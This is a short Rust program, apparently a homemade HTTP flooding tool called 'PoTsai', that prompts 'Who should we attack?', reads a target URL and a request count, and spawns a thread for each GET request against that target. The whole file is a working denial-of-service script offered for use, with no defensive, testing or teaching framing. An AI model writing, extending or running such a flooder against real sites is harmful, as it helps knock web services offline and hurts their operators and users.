extern crate futures;
extern crate hyper;
extern crate tokio_core;

use futures::{Future};
use hyper::{Client, Uri};
use tokio_core::reactor::Core;
use std::io;
use std::io::Write;
use std::thread;

fn read() -> String {
  let mut inp = String::new();
  io::stdin().read_line(&mut inp).expect("Failed to read line...");
  let mut inp: &str = inp.as_ref();
  inp = inp.trim();
  let inp: String = inp.to_string();
  return inp;
}

fn readi() -> i32 {
  let mut inp = String::new();
  io::stdin().read_line(&mut inp).expect("Failed to read line...");
  let mut inp: &str = inp.as_ref();
  inp = inp.trim();
  let inp: String = inp.to_string();
  let inp: i32 = match inp.parse() {
    Ok(num) => num,
    Err(_) => {
      println!("Please enter a number!");
      0
    }
  };
  return inp;
}

fn print_n(s: &str) {
  print!("{}", s);
  io::stdout().flush().unwrap();
}

fn new_thread(url: String, t: i64) {
    let name = format!("child{}", t);
    println!("CREATING NEW THREAD ON {}", name);
    thread::Builder::new().name(name.to_string()).spawn(move || {
        // Core is the Tokio event loop used for making a non-blocking request
        let mut core = Core::new().unwrap();

        let client = Client::new(&core.handle());

        let uri : Uri = url.parse().unwrap();

        let request = client.get(uri)
            .map(|res| {
                assert_eq!(res.status(), hyper::Ok);
            });

        // request is a Future, futures are lazy, so must explicitly run
        core.run(request).unwrap();
    }).expect("Failed to make thread...");
}

fn main() {
  println!("Welcome to PoTsai!");
  print_n("Who should we attack? :");
  let uri = read();
  print_n("How many requests should be made? :");
  let amnt = readi();

  for i in 0..amnt {
      let new = uri.clone();
      new_thread(new, i.into());
  }
}